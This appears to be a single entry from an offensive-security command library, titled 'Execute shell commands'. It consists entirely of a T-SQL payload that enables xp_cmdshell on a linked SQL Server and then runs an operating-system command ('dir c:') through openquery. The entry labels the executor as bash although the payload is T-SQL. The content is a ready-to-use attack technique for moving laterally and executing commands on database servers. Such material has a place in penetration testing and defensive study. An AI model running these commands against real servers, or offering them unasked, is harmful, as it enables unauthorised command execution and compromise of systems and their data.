---
id: 9b2112a2-b697-41b5-b07c-7c5eff5aceab
name: Execute shell commands
type: command
executor: bash
data: 'EXECUTE(''sp_configure ''''xp_cmdshell'''',1;reconfigure;'') AT LinkedServer

  select 1 from openquery("linkedserver",''select 1;exec master..xp_cmdshell "dir
  c:"'')'
output: null
created_at: '2023-04-06T03:56:34.105366+00:00'
updated_at: '2023-04-10T20:22:42.442119+00:00'
---

# Execute shell commands

```bash
EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT LinkedServer
select 1 from openquery("linkedserver",'select 1;exec master..xp_cmdshell "dir c:"')
```


